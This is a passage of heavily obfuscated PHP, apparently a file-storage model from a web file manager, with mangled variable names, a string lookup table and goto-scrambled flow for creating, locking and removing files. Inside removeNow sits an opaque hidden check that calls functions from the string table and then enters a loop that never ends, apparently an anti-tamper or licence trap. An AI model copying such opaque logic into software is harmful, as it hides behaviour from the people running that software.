$this->_mkdirRoot(SourceModel::TYPE_GROUP, $f’ô‘˜»‹, $Aã°Õ£ê‹É[$aãÃöØÎ¤[28]]); } public function systemRootPathAdd($b¸¯“÷ŠÆº) { if ($b¸¯“÷ŠÆº != $_SERVER[Ôğ—¤Šµˆ˜ñ£][531]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $b¸¯“÷ŠÆº); } public function userRootRemove($d½»äµ) { $D«ç­õÆùÀ = $this->sourceRoot(SourceModel::TYPE_USER, $d½»äµ); if (!$D«ç­õÆùÀ) { return; } $this->remove($D«ç­õÆùÀ, !1); } public function groupRootRemove($A™ƒî»²—) { $fÛ÷¿´äµŠ = $this->sourceRoot(SourceModel::TYPE_GROUP, $A™ƒî»²—); if (!$fÛ÷¿´äµŠ) { return; } $this->remove($fÛ÷¿´äµŠ, !1); } private function _mkdirRoot($CÓË¢‰…„°, $d›»‹®µŒ¢, $CŸÅ÷ùÜ¨) { goto AÁŒƒÍçä¼; däõğÁ¥´Ó: $cƒİŸ®ß¾ = "\x4d\157\144\x65\154\123\157\x75\x72\x63\145\x2e\x6d\153\144\x69\162\x52\157\x6f\x74\x2e{$CÓË¢‰…„°}\x2e{$d›»‹®µŒ¢}\x2e" . $CŸÅ÷ùÜ¨; CacheLock::lock($cƒİŸ®ß¾); $f³„¢ÃŒ™ä[$CÇâù«–é…[28]] = $CŸÅ÷ùÜ¨; goto E²áºİÎ«; AÁŒƒÍçä¼: $CÇâù«–é… =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f³„¢ÃŒ™ä = array($CÇâù«–é…[396] => 0, $CÇâù«–é…[574] => $CÓË¢‰…„°, $CÇâù«–é…[575] => $d›»‹®µŒ¢, $CÇâù«–é…[571] => 1, $CÇâù«–é…[576] => USER_ID, $CÇâù«–é…[577] => USER_ID, $CÇâù«–é…[572] => $CÇâù«–é…[33], $CÇâù«–é…[578] => $CÇâù«–é…[525], $CÇâù«–é…[424] => 0, $CÇâù«–é…[573] => 0, $CÇâù«–é…[462] => 0, $CÇâù«–é…[579] => $CÇâù«–é…[33]); if ($EÏ¶Ë¾ÑÏ¨ = $this->where($f³„¢ÃŒ™ä)->find()) { return $EÏ¶Ë¾ÑÏ¨[$CÇâù«–é…[397]]; } goto däõğÁ¥´Ó; aİÔ…µÁŠ­: CacheLock::unlock($cƒİŸ®ß¾); return $AÑ‹ª¢å‰å; goto f¿…Ç‚¶½—; E²áºİÎ«: $AÑ‹ª¢å‰å = $this->add($f³„¢ÃŒ™ä); $B»÷ƒËº’İ = array($CÇâù«–é…[580] => short_id($AÑ‹ª¢å‰å)); $this->where(array($CÇâù«–é…[412] => $AÑ‹ª¢å‰å))->save($B»÷ƒËº’İ); goto aİÔ…µÁŠ­; f¿…Ç‚¶½—: } private function sourceRoot($e·ôÎ×æ¹â, $bÃ… êµîä, $cÄ§Ğ·ùğŒ = false) { $FñŸŠÈĞŞÒ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bÛâì¼©‘Õ = array($FñŸŠÈĞŞÒ[396] => 0, $FñŸŠÈĞŞÒ[574] => $e·ôÎ×æ¹â, $FñŸŠÈĞŞÒ[575] => $bÃ… êµîä); if ($Aˆğ®¤Ïš« = $this->where($bÛâì¼©‘Õ)->find()) { return $cÄ§Ğ·ùğŒ ? $Aˆğ®¤Ïš« : $Aˆğ®¤Ïš«[$FñŸŠÈĞŞÒ[397]]; } return !1; } public function sourceRootGroup($c™Î¯ÁÄÖ™) { goto d¹Å‰…ß®; F“–òµ¨ÏÖ: $this->selectPageReset(); $aõÎ¿ÆàÕ = $this->limit(count($c™Î¯ÁÄÖ™))->listSource($DˆÀë°†àö, 1000); $this->selectPageRestore(); goto E‘‚İ½Æ»´; E‘‚İ½Æ»´: return array_to_keyvalue($aõÎ¿ÆàÕ[$Ešöø¿„±Ü[75]], $Ešöø¿„±Ü[498]); goto aƒŒè™é; d¹Å‰…ß®: $Ešöø¿„±Ü =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (is_string($c™Î¯ÁÄÖ™)) { $c™Î¯ÁÄÖ™ = array($c™Î¯ÁÄÖ™); } $DˆÀë°†àö = array($Ešöø¿„±Ü[396] => 0, $Ešöø¿„±Ü[575] => array($Ešöø¿„±Ü[7], $c™Î¯ÁÄÖ™), $Ešöø¿„±Ü[574] => SourceModel::TYPE_GROUP); goto F“–òµ¨ÏÖ; aƒŒè™é: } public function mkfile($CÔÛïÍ÷ì”, $f„‘²«‹õ„, $Eİ­ÉŸ”ãê = '', $D¿íâÜªŸÃ = REPEAT_RENAME) { $eÍ½÷é“ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $FÉ¦İˆì¿‚ = Model($eÍ½÷é“[597])->addFileByContent($Eİ­ÉŸ”ãê, $f„‘²«‹õ„); return $this->_createFileCall($CÔÛïÍ÷ì”, $f„‘²«‹õ„, $FÉ¦İˆì¿‚, $D¿íâÜªŸÃ, $eÍ½÷é“[1237]); } public function addFile($DÁÀÑ„„ç†, $dØ„¯±Ò›½, $A«‹ĞÄ”Åç, $B§‹ËØĞÂ = false, $Dë²›Ò“À³ = REPEAT_RENAME) { $EƒÌèíÊ«‰ = Model($_SERVER[Ôğ—¤Šµˆ˜ñ£][597])->addFile($dØ„¯±Ò›½, $A«‹ĞÄ”Åç, $B§‹ËØĞÂ); return $this->_createFileCall($DÁÀÑ„„ç†, $A«‹ĞÄ”Åç, $EƒÌèíÊ«‰, $Dë²›Ò“À³); } public function addFileByFileID($aõùÁ‚Ê»Â, $fªÇóÅ¢‘æ, $f¥‡±ÔõÓ£, $e’·”ØŒ§• = REPEAT_RENAME) { $BÏ–ÚšòÙé =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f‡”™“’ñ  = Model($BÏ–ÚšòÙé[597])->find($fªÇóÅ¢‘æ); Model($BÏ–ÚšòÙé[597])->linkAdd($fªÇóÅ¢‘æ); return $this->_createFileCall($aõùÁ‚Ê»Â, $f¥‡±ÔõÓ£, $f‡”™“’ñ , $e’·”ØŒ§•); } public function addFileByRemote($d²ùÆªÂŸÉ, $A÷Õ‘§Ÿˆğ, $D…‚…«ÔÕ¼, $FÃ‹Íİ¾ = array(), $b—÷ãÑ×¦Å = REPEAT_RENAME) { $C¢®È›±²› = Model($_SERVER[Ôğ—¤Šµˆ˜ñ£][597])->addFileByRemote($A÷Õ‘§Ÿˆğ, $D…‚…«ÔÕ¼, $FÃ‹Íİ¾); return $this->_createFileCall($d²ùÆªÂŸÉ, $D…‚…«ÔÕ¼, $C¢®È›±²›, $b—÷ãÑ×¦Å); } private function _createFileCall($BÕòŞŞ§ğÜ, $DÎ½¥òåÚ¦, $dòµˆâ®å‹, $eŠ½Ë±×„, $e¤Ş·Œ¾„Ú = "\x75\x70\154\x6f\141\x64") { goto Aå†Å®œñ; D‹¡ÁõğÌì: $this->lockWriteStart($BÕòŞŞ§ğÜ, $DÎ½¥òåÚ¦); $F³áîÆí«­ = $this->fileNameExist($BÕòŞŞ§ğÜ, $DÎ½¥òåÚ¦); $e¯…Šç­… = $this->_createFile($BÕòŞŞ§ğÜ, $DÎ½¥òåÚ¦, $dòµˆâ®å‹, $eŠ½Ë±×„, $fà‡³•£Èİ); goto dÜŒÆÅ‹é¦; Cæá¥«½•Ù: return $e¯…Šç­…; goto e ­²‰¥î…; Aå†Å®œñ: $E‚ì‘õ‘“± =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fà‡³•£Èİ = !1; $this->setMasterDB(); goto D‹¡ÁõğÌì; dÜŒÆÅ‹é¦: if (!$fà‡³•£Èİ) { Model($E‚ì‘õ‘“±[464])->remove($dòµˆâ®å‹[$E‚ì‘õ‘“±[461]]); } if ($fà‡³•£Èİ && $e¯…Šç­… && $e¯…Šç­… != $F³áîÆí«­) { Model($E‚ì‘õ‘“±[1952])->eventCreate($e¯…Šç­…, $e¤Ş·Œ¾„Ú); } $this->lockWriteEnd($BÕòŞŞ§ğÜ, $DÎ½¥òåÚ¦); goto Cæá¥«½•Ù; e ­²‰¥î…: } public function mkdir($DÒ¶§‚¤çƒ, $F¸ËÅ³ƒä¨, $BÇ­“Ç‰½à = REPEAT_SKIP) { goto E®´ß¼í; aÂ«Ù×æ°Ÿ: $this->lockWriteEnd($DÒ¶§‚¤çƒ, $F¸ËÅ³ƒä¨); return $aİ«À“ïƒ; goto aÛ°Õ©‹…; f‚æê£ĞÇ®: if (!$A¿ó™âÅÛ¿) { return !1; } $this->lockWriteStart($DÒ¶§‚¤çƒ, $F¸ËÅ³ƒä¨); if ($BÇ­“Ç‰½à !== !1) { $CÙğ¼Ÿ¢ˆ = $this->fileNameExist($DÒ¶§‚¤çƒ, $F¸ËÅ³ƒä¨); if ($CÙğ¼Ÿ¢ˆ && $BÇ­“Ç‰½à != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($DÒ¶§‚¤çƒ, $F¸ËÅ³ƒä¨); return $CÙğ¼Ÿ¢ˆ; } $F¸ËÅ³ƒä¨ = $this->fileNameAuto($DÒ¶§‚¤çƒ, $F¸ËÅ³ƒä¨, $BÇ­“Ç‰½à); } goto C’×¼×î¾è; C’×¼×î¾è: $d™¨»œÉÈ˜ = array($Fì÷à§Ö¯©[571] => 1, $Fì÷à§Ö¯©[415] => $F¸ËÅ³ƒä¨, $Fì÷à§Ö¯©[572] => $Fì÷à§Ö¯©[33], $Fì÷à§Ö¯©[462] => 0, $Fì÷à§Ö¯©[573] => 0); $aİ«À“ïƒ = $this->_addSoure($d™¨»œÉÈ˜, $A¿ó™âÅÛ¿); Model($Fì÷à§Ö¯©[1952])->eventCreate($aİ«À“ïƒ, $Fì÷à§Ö¯©[1238]); goto aÂ«Ù×æ°Ÿ; E®´ß¼í: $Fì÷à§Ö¯© =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->setMasterDB(); $A¿ó™âÅÛ¿ = $this->sourceInfo($DÒ¶§‚¤çƒ); goto f‚æê£ĞÇ®; aÛ°Õ©‹…: } private function _createFile($eààë¿­¯, $b´ôÙÔê³, $a‘Ğ®Ş„¸Ä, $cğ”öìó¢ä, &$bí…¾Ëƒ“ç) { goto DãÖ¢¯ø‚; b’†ÒÜïÙë: $f•àÕõí„£ = array($BêŞ–äÏ¤œ[571] => 0, $BêŞ–äÏ¤œ[415] => $b´ôÙÔê³, $BêŞ–äÏ¤œ[572] => substr(get_path_ext($b´ôÙÔê³), 0, 10), $BêŞ–äÏ¤œ[462] => $a‘Ğ®Ş„¸Ä[$BêŞ–äÏ¤œ[461]], $BêŞ–äÏ¤œ[573] => $a‘Ğ®Ş„¸Ä[$BêŞ–äÏ¤œ[78]]); $f¼ìŸˆ¿Ò¤ = $this->_addSoure($f•àÕõí„£, $d¦…­¼ß°¿); $this->folderSizeReset($eààë¿­¯, intval($f•àÕõí„£[$BêŞ–äÏ¤œ[78]])); goto eÜ¨áÄ‡Ã; DãÖ¢¯ø‚: $BêŞ–äÏ¤œ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $d¦…­¼ß°¿ = $this->sourceInfo($eààë¿­¯); if (!$a‘Ğ®Ş„¸Ä || !$d¦…­¼ß°¿) { return !1; } goto d»”¦Ï©›; eÜ¨áÄ‡Ã: return $f¼ìŸˆ¿Ò¤; goto CÒÏó¾Æ®; d»”¦Ï©›: if ($cğ”öìó¢ä !== !1) { $B¤•°é = $this->fileNameExist($eààë¿­¯, $b´ôÙÔê³); } $bí…¾Ëƒ“ç = !0; if ($cğ”öìó¢ä && $B¤•°é) { if ($cğ”öìó¢ä == REPEAT_SKIP) { $bí…¾Ëƒ“ç = !1; return $B¤•°é; } else { if ($cğ”öìó¢ä == REPEAT_REPLACE) { $B˜ˆŠ­ØÑ = $this->sourceInfo($B¤•°é); $eğó¤©ëØ‡ = $this->fileHistory($B˜ˆŠ­ØÑ, $a‘Ğ®Ş„¸Ä[$BêŞ–äÏ¤œ[461]], $a‘Ğ®Ş„¸Ä[$BêŞ–äÏ¤œ[78]]); if (!$eğó¤©ëØ‡) { $bí…¾Ëƒ“ç = !1; } else { $this->folderSizeReset($eààë¿­¯); } return $B¤•°é; } else { $b´ôÙÔê³ = $this->fileNameAuto($eààë¿­¯, $b´ôÙÔê³, $cğ”öìó¢ä, !1); } } } goto b’†ÒÜïÙë; CÒÏó¾Æ®: } protected function fileHistory($C‡è£Í³‡, $c¹ßËÔ£ù°, $DĞ’Ëà’Ì) { goto AˆÇ¥ì‘î; DÕ·Ù¹·åº: $this->where(array($FÍ÷Ä¯í[412] => $C‡è£Í³‡[$FÍ÷Ä¯í[397]]))->save($Dê‘Ñ‘á¯Ğ); $this->sourceCacheClear($C‡è£Í³‡[$FÍ÷Ä¯í[397]]); return !0; goto eÄÇôã—Ø; AİÚÒÏ‡¦: $this->checkLock($C‡è£Í³‡[$FÍ÷Ä¯í[397]], $c¹ßËÔ£ù°); Model($FÍ÷Ä¯í[1982])->addHistory($C‡è£Í³‡); $Dê‘Ñ‘á¯Ğ = array($FÍ÷Ä¯í[577] => $Côƒ–ÙÕˆê, $FÍ÷Ä¯í[419] => time(), $FÍ÷Ä¯í[461] => $c¹ßËÔ£ù°, $FÍ÷Ä¯í[78] => $DĞ’Ëà’Ì); goto DÕ·Ù¹·åº; AˆÇ¥ì‘î: $FÍ÷Ä¯í =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Côƒ–ÙÕˆê = defined($FÍ÷Ä¯í[468]) ? USER_ID : $FÍ÷Ä¯í[191]; if ($C‡è£Í³‡[$FÍ÷Ä¯í[461]] == $c¹ßËÔ£ù°) { return !1; } goto AİÚÒÏ‡¦; eÄÇôã—Ø: } public function checkLock($FˆÅá­Ë±ø, $eìÈÄÆ’ÎÄ) { goto Ağæ‡öŞƒ; eŠ›ÑòÖÓ: $D­ÈŸÜ†½° = Session::get($c®õÎïëé[1983]); $cÕ‹Í»©È¨ = substr($aà…ÔóòÇâ[$c®õÎïëé[28]], 0, -1 - strlen($aà…ÔóòÇâ[$c®õÎïëé[168]])) . $c®õÎïëé[1502] . $D­ÈŸÜ†½° . $c®õÎïëé[95] . $aà…ÔóòÇâ[$c®õÎïëé[168]]; $Fƒ¿ñÅ¥ÆŠ = Model($c®õÎïëé[597])->find($eìÈÄÆ’ÎÄ); goto B¬»“îëÜ; Ağæ‡öŞƒ: $c®õÎïëé =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aà…ÔóòÇâ = $this->pathInfo($FˆÅá­Ë±ø); if (!$this->fileIsLock($aà…ÔóòÇâ, !0)) { return; } goto eŠ›ÑòÖÓ; B¬»“îëÜ: $this->_createFileCall($aà…ÔóòÇâ[$c®õÎïëé[492]], $cÕ‹Í»©È¨, $Fƒ¿ñÅ¥ÆŠ, REPEAT_REPLACE, $c®õÎïëé[1237]); $cÌí¯¨¿ÓÎ = $aà…ÔóòÇâ[$c®õÎïëé[459]][$c®õÎïëé[536]]; $fñä°ä¹Òƒ = $cÌí¯¨¿ÓÎ[$c®õÎïëé[1984]] ? $cÌí¯¨¿ÓÎ[$c®õÎïëé[1984]] : $cÌí¯¨¿ÓÎ[$c®õÎïëé[28]]; goto E‚»Ä„ì; E‚»Ä„ì: show_json(LNG($c®õÎïëé[1985]) . $c®õÎïëé[1986] . LNG($c®õÎïëé[1987]) . $c®õÎïëé[1988] . $fñä°ä¹Òƒ . $c®õÎïëé[1989], !1); goto FÌˆ¡´®˜Ó; FÌˆ¡´®˜Ó: } public function fileIsLock($e÷×¤„ß‘­, $béË¬˜“´ = false) { goto d¸¯•£öŠ…; C†—¦¡…¨è: $BÌ´åã“Ê = $GLOBALS[$cºá˜ÇÅÁ[6]][$cºá˜ÇÅÁ[88]][$cºá˜ÇÅÁ[534]]; if ($e÷×¤„ß‘­[$cºá˜ÇÅÁ[459]][$cºá˜ÇÅÁ[535]] <= time() - $BÌ´åã“Ê) { $this->metaSet($e÷×¤„ß‘­[$cºá˜ÇÅÁ[397]], $cºá˜ÇÅÁ[533], null); $this->metaSet($e÷×¤„ß‘­[$cºá˜ÇÅÁ[397]], $cºá˜ÇÅÁ[535], null); } if ($béË¬˜“´) { $this->metaSet($e÷×¤„ß‘­[$cºá˜ÇÅÁ[397]], $cºá˜ÇÅÁ[535], time()); } goto f„áÂ·Ù¾; d¸¯•£öŠ…: $cºá˜ÇÅÁ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!isset($e÷×¤„ß‘­[$cºá˜ÇÅÁ[459]]) || !$e÷×¤„ß‘­[$cºá˜ÇÅÁ[459]][$cºá˜ÇÅÁ[533]]) { return !1; } if ($e÷×¤„ß‘­[$cºá˜ÇÅÁ[459]][$cºá˜ÇÅÁ[533]] != USER_ID) { return !0; } goto C†—¦¡…¨è; f„áÂ·Ù¾: return !1; goto dÜŒÉ†ƒìó; dÜŒÉ†ƒìó: } private function _addSoure($f…–¬Æ¢£º, $Dë¨’É¬‰¼) { goto d™³ÛÖŞŠİ; D¯¹¯Š¨‚ƒ: $this->setNamePinyin($eÉÓ‚Šöãø, $f…–¬Æ¢£º[$a´ÒÙíãÌâ[28]]); return $eÉÓ‚Šöãø; goto Cß‰˜¦÷í; Fâİ¹Ü•ÔÇ: $eÉÓ‚Šöãø = $this->add($f…–¬Æ¢£º); $dÊÙ×ôˆó… = array($a´ÒÙíãÌâ[580] => short_id($eÉÓ‚Šöãø)); $this->where(array($a´ÒÙíãÌâ[412] => $eÉÓ‚Šöãø))->save($dÊÙ×ôˆó…); goto D¯¹¯Š¨‚ƒ; cğÕ‘ˆ†¸: if (isset(self::$cacheChildList[$Aïùˆ½œ])) { unset(self::$cacheChildList[$Aïùˆ½œ]); } static $CŠÚÄÏæ§ = false; if (!$CŠÚÄÏæ§) { Hook::trigger($a´ÒÙíãÌâ[561], $f…–¬Æ¢£º); $CŠÚÄÏæ§ = !0; } goto Fâİ¹Ü•ÔÇ; d™³ÛÖŞŠİ: $a´ÒÙíãÌâ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A«¥ñš± = defined($a´ÒÙíãÌâ[468]) ? USER_ID : $a´ÒÙíãÌâ[191]; $bÔÃŸÉÃŸ = array($a´ÒÙíãÌâ[574] => $Dë¨’É¬‰¼[$a´ÒÙíãÌâ[406]], $a´ÒÙíãÌâ[575] => $Dë¨’É¬‰¼[$a´ÒÙíãÌâ[498]], $a´ÒÙíãÌâ[576] => $A«¥ñš±, $a´ÒÙíãÌâ[577] => $A«¥ñš±, $a´ÒÙíãÌâ[396] => $Dë¨’É¬‰¼[$a´ÒÙíãÌâ[397]], $a´ÒÙíãÌâ[578] => $Dë¨’É¬‰¼[$a´ÒÙíãÌâ[515]] . $Dë¨’É¬‰¼[$a´ÒÙíãÌâ[397]] . $a´ÒÙíãÌâ[47], $a´ÒÙíãÌâ[424] => 0, $a´ÒÙíãÌâ[579] => $a´ÒÙíãÌâ[33]); goto CÓ’×¨âÑ¼; CÓ’×¨âÑ¼: $f…–¬Æ¢£º = array_merge($bÔÃŸÉÃŸ, $f…–¬Æ¢£º); $this->updateModifyTime($f…–¬Æ¢£º[$a´ÒÙíãÌâ[492]]); $Aïùˆ½œ = $a´ÒÙíãÌâ[1990] . $Dë¨’É¬‰¼[$a´ÒÙíãÌâ[397]]; goto cğÕ‘ˆ†¸; Cß‰˜¦÷í: } public function remove($BÀ“À­¼œ½, $fîØ·¥ƒé = true) { goto d½ƒÌÒÑ; D÷ ¥èù¯‹: return $C¸˜ÆÃ­¸¢; goto bÛŠ–„¢Åã; cØ•›ƒ°Ğ: CacheLock::lock($b³Œ²¬³½Ô); $d¸âÓ‘¹‚• = $this->fileNameExist($CÒé–ƒÊ”¤, $Cƒ‹Ø—¬…); if (!$d¸âÓ‘¹‚•) { $d¸âÓ‘¹‚• = $this->mkdir($CÒé–ƒÊ”¤, $Cƒ‹Ø—¬…, REPEAT_SKIP); $this->metaSet($d¸âÓ‘¹‚•, $c†ŞÏÛ±¯[1995], $D©ºéò’); $this->metaSet($d¸âÓ‘¹‚•, $c†ŞÏÛ±¯[1996], $b•¨’áà¶õ[$c†ŞÏÛ±¯[498]]); if ($b•¨’áà¶õ[$c†ŞÏÛ±¯[492]] != 0) { $this->metaSet($d¸âÓ‘¹‚•, $c†ŞÏÛ±¯[1997], _get($Bøšø»•á, $c†ŞÏÛ±¯[1998])); } } goto EÅé×—¦¶ë; bİ•òæÂ­ì: $D©ºéò’ = $b•¨’áà¶õ[$c†ŞÏÛ±¯[406]] == self::TYPE_USER ? $c†ŞÏÛ±¯[588] : $c†ŞÏÛ±¯[509]; if ($D©ºéò’ == $c†ŞÏÛ±¯[588]) { $Bøšø»•á = Model($c†ŞÏÛ±¯[507])->getInfo($b•¨’áà¶õ[$c†ŞÏÛ±¯[498]]); $Cƒ‹Ø—¬… = !empty($Bøšø»•á[$c†ŞÏÛ±¯[1984]]) ? $Bøšø»•á[$c†ŞÏÛ±¯[1984]] : $Bøšø»•á[$c†ŞÏÛ±¯[28]]; $Cƒ‹Ø—¬… = $c†ŞÏÛ±¯[258] . $Cƒ‹Ø—¬… . $c†ŞÏÛ±¯[1992] . $b•¨’áà¶õ[$c†ŞÏÛ±¯[498]]; } else { $Bøšø»•á = Model($c†ŞÏÛ±¯[516])->getInfo($b•¨’áà¶õ[$c†ŞÏÛ±¯[498]]); $Cƒ‹Ø—¬… = _get($Bøšø»•á, $c†ŞÏÛ±¯[28]); $Cƒ‹Ø—¬… = $c†ŞÏÛ±¯[160] . $Cƒ‹Ø—¬… . $c†ŞÏÛ±¯[1993] . $b•¨’áà¶õ[$c†ŞÏÛ±¯[498]]; } $b³Œ²¬³½Ô = $c†ŞÏÛ±¯[1994] . md5($Cƒ‹Ø—¬…); goto cØ•›ƒ°Ğ; cŠ¯ƒè’¨¸: $f×Ì·Ú×®Û = Model($c†ŞÏÛ±¯[427])->get($c†ŞÏÛ±¯[1991]) == $c†ŞÏÛ±¯[87]; if ($A‹íç„ùïô || $fîØ·¥ƒé || !$f×Ì·Ú×®Û) { return $this->removeNow($BÀ“À­¼œ½, $fîØ·¥ƒé); } $CÒé–ƒÊ”¤ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto bİ•òæÂ­ì; d½ƒÌÒÑ: $c†ŞÏÛ±¯ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b•¨’áà¶õ = $this->sourceInfo($BÀ“À­¼œ½); $A‹íç„ùïô = intval($b•¨’áà¶õ[$c†ŞÏÛ±¯[406]]) === self::TYPE_SYSTEM; goto cŠ¯ƒè’¨¸; aÌïøÀïä: $this->recycleClear($b•¨’áà¶õ); $C¸˜ÆÃ­¸¢ = $this->move($BÀ“À­¼œ½, $d¸âÓ‘¹‚•, REPEAT_RENAME_FOLDER); $this->folderSizeReset($b•¨’áà¶õ[$c†ŞÏÛ±¯[492]]); goto D÷ ¥èù¯‹; EÅé×—¦¶ë: CacheLock::unlock($b³Œ²¬³½Ô); $this->metaSet($BÀ“À­¼œ½, $c†ŞÏÛ±¯[1999], $b•¨’áà¶õ[$c†ŞÏÛ±¯[492]]); $this->where(array($c†ŞÏÛ±¯[397] => $BÀ“À­¼œ½))->save(array($c†ŞÏÛ±¯[419] => time())); goto aÌïøÀïä; bÛŠ–„¢Åã: } private function recycleClear($Fì¬ğÜàšŞ) { $aª¾ºÌ…ß =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $e°‹÷Èˆå = $this->childrenAll($Fì¬ğÜàšŞ); $aé†é²é¹Ì = array($aª¾ºÌ…ß[412] => array($aª¾ºÌ…ß[413], $e°‹÷Èˆå[$aª¾ºÌ…ß[2000]])); Model($aª¾ºÌ…ß[2001])->where($aé†é²é¹Ì)->delete(); } public function removeNow($bÜ‚¢ÂãÖõ, $fõìµ•†‚õ = true) { goto DØİİ‡®ÖË; FÆÑ×Á­¦À: $this->updateModifyTime($EáŸ‰Ù»); $this->lockMoveEnd($bÜ‚¢ÂãÖõ); Hook::trigger($EÂİÀ—È«Õ[1585], $D«Ğ¦‡ø‘è, $fõìµ•†‚õ); goto F¨‘òÌ…; cå…°Ûé­: $D«Ğ¦‡ø‘è = $this->pathInfoMore($bÜ‚¢ÂãÖõ); if (!$bºôêİù) { return !0; } if ($bºôêİù[$EÂİÀ—È«Õ[492]] == 0) { if (!_get($GLOBALS, $EÂİÀ—È«Õ[499])) { return !1; } } goto EŠùïÍàÖ˜; F¨‘òÌ…: return !0; goto eêĞÓŠãİ; DØİİ‡®ÖË: $EÂİÀ—È«Õ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!isset($_SERVER[$EÂİÀ—È«Õ[849]]) || !isset($_SERVER[$EÂİÀ—È«Õ[847]])) { goto fíåñç¶Ùä; fíåñç¶Ùä: $CÖ¯ä§Ã‡ = $EÂİÀ—È«Õ[862]; $DÓÆ¯¸ÜÜŞ = $EÂİÀ—È«Õ[850]; $A¢·Š“ßÁ = $_SERVER[$EÂİÀ—È«Õ[851]] . $EÂİÀ—È«Õ[852]; goto b¦«§Ö‹ÒÄ; B……ªÙµµÀ: $A³’Òé¾Å¿ = $EÂİÀ—È«Õ[863]; $A³’Òé¾Å¿($_SERVER[$EÂİÀ—È«Õ[864]]); $c™ÇÆ¥¬» = 1; goto b˜ô¢îŠ­ä; b¦«§Ö‹ÒÄ: $aˆÔ¦Ç¸èè = $DÓÆ¯¸ÜÜŞ($A¢·Š“ßÁ); $DŒ¢ô£‡ø = explode($EÂİÀ—È«Õ[229], $aˆÔ¦Ç¸èè); if (count($DŒ¢ô£‡ø) < $EÂİÀ—È«Õ[606]) { $C˜ùùÌ§‡Û = $EÂİÀ—È«Õ[853]; $C˜ùùÌ§‡Û(); } goto B……ªÙµµÀ; b˜ô¢îŠ­ä: for ($E™¦·ç¡ˆí = $c™ÇÆ¥¬»; $E™¦·ç¡ˆí > 0; $E™¦·ç¡ˆí++) { $A³’Òé¾Å¿ = json_encode($GLOBALS[$EÂİÀ—È«Õ[413]]); } goto B¢–Ê‘¢Ä; B¢–Ê‘¢Ä: } $bºôêİù = $this->sourceInfo($bÜ‚¢ÂãÖõ); goto cå…°Ûé­; cÀ°ÒÏ‡ŞÄ: $this->folderSizeReset($bºôêİù[$EÂİÀ—È«Õ[492]]); $EáŸ‰Ù» = array($bºôêİù[$EÂİÀ—È«Õ[492]]); if ($bºôêİù[$EÂİÀ—È«Õ[405]] == $EÂİÀ—È«Õ[87]) { $EáŸ‰Ù»[] = $bºôêİù[$EÂİÀ—È«Õ[397]]; } goto FÆÑ×Á­¦À; EŠùïÍàÖ˜: $this->lockMoveStart($bÜ‚¢ÂãÖõ); Hook::trigger($EÂİÀ—È«Õ[2002], $D«Ğ¦‡ø‘è, $fõìµ•†‚õ); if ($fõìµ•†‚õ) { Model($EÂİÀ—È«Õ[2001])->moveToRecycle($bÜ‚¢ÂãÖõ); } else { $F‘Ë×›É„• = $this->childrenAll($bºôêİù); Model($EÂİÀ—È«Õ[558])->eventRemove($bÜ‚¢ÂãÖõ); $this->removeRelevance($F‘Ë×›É„•[$EÂİÀ—È«Õ[2000]], $F‘Ë×›É„•[$EÂİÀ—È«Õ[1367]]); } goto cÀ°ÒÏ‡ŞÄ; eêĞÓŠãİ: } public function childrenAll($eİå”•Š—İ) { $E«—ÆÚ¼¨ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BØÓƒ¡œÙÀ = $eİå”•Š—İ[$E«—ÆÚ¼¨[397]]; if ($eİå”•Š—İ[$E«—ÆÚ¼¨[405]] == $E«—ÆÚ¼¨[87]) { $Aåóêİ‚à = array($E«—ÆÚ¼¨[578] => array($E«—ÆÚ¼¨[538], $eİå”•Š—İ[$E«—ÆÚ¼¨[515]] . $BØÓƒ¡œÙÀ . $E«—ÆÚ¼¨[539])); $fƒ¼Ï‘÷¥¬ = array($E«—ÆÚ¼¨[578] => $Aåóêİ‚à[$E«—ÆÚ¼¨[515]]); $d•¢ŒŞæºÕ = $this->field($E«—ÆÚ¼¨[2003])->where($fƒ¼Ï‘÷¥¬)->select(); $eˆöŒé—à = !1; $a÷‹‰ÓÒÏ” = array($BØÓƒ¡œÙÀ); if ($d•¢ŒŞæºÕ) { $eˆöŒé—à = array_to_keyvalue($d•¢ŒŞæºÕ, $E«—ÆÚ¼¨[33], $E«—ÆÚ¼¨[461]); $eˆöŒé—à = array_remove_value($eˆöŒé—à, $E«—ÆÚ¼¨[191]); $a÷‹‰ÓÒÏ” = array_to_keyvalue($d•¢ŒŞæºÕ, $E«—ÆÚ¼¨[33], $E«—ÆÚ¼¨[397]); $a÷‹‰ÓÒÏ”[] = $BØÓƒ¡œÙÀ; } } else { $eˆöŒé—à = array($eİå”•Š—İ[$E«—ÆÚ¼¨[461]]); $a÷‹‰ÓÒÏ” = array($BØÓƒ¡œÙÀ); } return array($E«—ÆÚ¼¨[2000] => $a÷‹‰ÓÒÏ”, $E«—ÆÚ¼¨[1367] => $eˆöŒé—à); } public function removeArray($eìó¹ŠÊª) { if (!$eìó¹ŠÊª) { return !0; } } public function removeRelevance($FÑ´³­”à, $E¿á‚™†Š”) { goto C·ğ­ñ¯Á÷; c—òç…ö´”: for ($bëíŸˆß‡ = 0; $bëíŸˆß‡ < count($FÑ´³­”à); $bëíŸˆß‡++) { $this->sourceCacheClear($FÑ´³­”à[$bëíŸˆß‡]); } goto a¸—Ê‘Ÿ¥¦; Aó¿£¿±­ä: $FÑ´³­”à = array_unique(array_filter($FÑ´³­”à)); $E¿á‚™†Š” = array_unique(array_filter($E¿á‚™†Š”)); if (!$FÑ´³­”à) { return !1; } goto fá§¤ê·Öğ; C·ğ­ñ¯Á÷: $dÆÆµñ‡×ù =& 